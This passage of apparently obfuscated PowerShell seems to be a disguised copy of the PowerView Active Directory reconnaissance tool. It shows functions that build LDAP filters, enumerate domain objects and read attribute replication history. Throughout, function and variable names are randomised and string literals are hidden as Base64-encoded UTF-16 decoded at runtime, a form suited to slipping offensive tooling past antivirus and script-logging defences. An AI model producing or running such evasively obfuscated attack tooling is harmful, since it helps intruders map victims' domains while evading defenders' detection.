                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${d131b16e921b4fa598afb42f46f41422}.dispose()
        }
    }
}
function dc2f41a670d5455b8f64f106e1b09449 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${598368791be24354b9a053d51b7a6598} = [Enum]::GetNames(${ad9be41dbd0943c2b70046d95a560c23})
        ${598368791be24354b9a053d51b7a6598} = ${598368791be24354b9a053d51b7a6598} | ForEach-Object {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        bef71dfb45ba46c1b577a61e7f67f221 -Name UACFilter -ValidateSet ${598368791be24354b9a053d51b7a6598} -c8f42b8a5203479ba051f687fab516f8 ([array])
    }
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8fed11d8b09b404a8c97130ad53603fe} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            bef71dfb45ba46c1b577a61e7f67f221 -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${8fed11d8b09b404a8c97130ad53603fe}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApAA==')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0A')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwAgAGYAcgBvAG0AIAAnACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQAnAA==')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                        ${8fed11d8b09b404a8c97130ad53603fe} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${8fed11d8b09b404a8c97130ad53603fe}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewA3AGUAZQBmADAANQAxADcAYQBmAGUAOQA0ADUAOQA3AGEAZgA4AGEAYgA0AGIAZQAzADkAYQA3ADIANAA1ADEAfQAnAA==')))
                        }
                    }
                }
                elseif (${56aaa31f880a49e195bcf739ac331528} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${a58a88389bba4f499974f2986992284e} = (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                }
                elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('\')) {
                    ${742ef5907a3c4a6fa08a69570e3b96f2} = ${56aaa31f880a49e195bcf739ac331528}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | a4ad8c5db2444528bab99963038ffd7c -d6f8ca3d1c994c23b84c147c1aa4c2c9 Canonical
                    if (${742ef5907a3c4a6fa08a69570e3b96f2}) {
                        ${ccd9638d1ab2424184c4f60a25a81d62} = ${742ef5907a3c4a6fa08a69570e3b96f2}.SubString(0, ${742ef5907a3c4a6fa08a69570e3b96f2}.IndexOf('/'))
                        ${d43566a07dda43778aacb7392fc974f0} = ${56aaa31f880a49e195bcf739ac331528}.Split('\')[1]
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAZAA0ADMANQA2ADYAYQAwADcAZABkAGEANAAzADcANwA4AGEAYQBjAGIANwAzADkAMgBmAGMAOQA3ADQAZgAwAH0AKQA=')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${ccd9638d1ab2424184c4f60a25a81d62}
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAYwBjAGQAOQA2ADMAOABkADEAYQBiADIANAAyADQAMQA4ADQAYwA0AGYANgAwAGEAMgA1AGEAOAAxAGQANgAyAH0AJwAgAGYAcgBvAG0AIAAnACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQAnAA==')))
                        ${8fed11d8b09b404a8c97130ad53603fe} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                    }
                }
                elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('.')) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQApAA==')))
                }
                else {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQApAA==')))
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${834edd590d404d47a0f82b91e88597ca} = $_.Substring(4)
                    ${f2105d7958054e66951a27fa8dd3e8bb} = [Int](${ad9be41dbd0943c2b70046d95a560c23}::${834edd590d404d47a0f82b91e88597ca})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAZgAyADEAMAA1AGQANwA5ADUAOAAwADUANABlADYANgA5ADUAMQBhADIANwBmAGEAOABkAGQAMwBlADgAYgBiAH0AKQApAA==')))
                }
                else {
                    ${f2105d7958054e66951a27fa8dd3e8bb} = [Int](${ad9be41dbd0943c2b70046d95a560c23}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewBmADIAMQAwADUAZAA3ADkANQA4ADAANQA0AGUANgA2ADkANQAxAGEAMgA3AGYAYQA4AGQAZAAzAGUAOABiAGIAfQApAA==')))
                }
            }
            if ($Filter -and $Filter -ne '') {
                ${8fed11d8b09b404a8c97130ad53603fe}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $(${8fed11d8b09b404a8c97130ad53603fe}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${8fed11d8b09b404a8c97130ad53603fe}.FindOne() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${8fed11d8b09b404a8c97130ad53603fe}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQALgBSAGEAdwA='))))
                }
                else {
                    $Object = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQA'))))
                }
                $Object
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${8fed11d8b09b404a8c97130ad53603fe}.dispose()
        }
    }
}
function Get-DomainObjectAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))] = $FindOne }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${215b02075a644ff7b2e4df9faac88a32} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${215b02075a644ff7b2e4df9faac88a32} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
            ${5c9e4befbd7045278c649df1e23e1dc8} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${6981d33ed3264afe8f122b1054b2eeee} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA==')))]) {
                ${2d1b3fbce869492e9d8fa38d2a2dc474} = [xml]${6981d33ed3264afe8f122b1054b2eeee} | Select-Object -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAEEAVABUAFIAXwBNAEUAVABBAF8ARABBAFQAQQA='))) -ErrorAction SilentlyContinue
                if (${2d1b3fbce869492e9d8fa38d2a2dc474}) {
                    if (${2d1b3fbce869492e9d8fa38d2a2dc474}.pszAttributeName -Match ${215b02075a644ff7b2e4df9faac88a32}) {
                        ${b01c344f140447efaf17619a650a69ed} = New-Object PSObject
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${5c9e4befbd7045278c649df1e23e1dc8}
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszAttributeName
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeLastOriginatingChange
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.dwVersion
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszLastOriginatingDsaDN
                        ${b01c344f140447efaf17619a650a69ed}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${b01c344f140447efaf17619a650a69ed}
                    }
                }
                else {
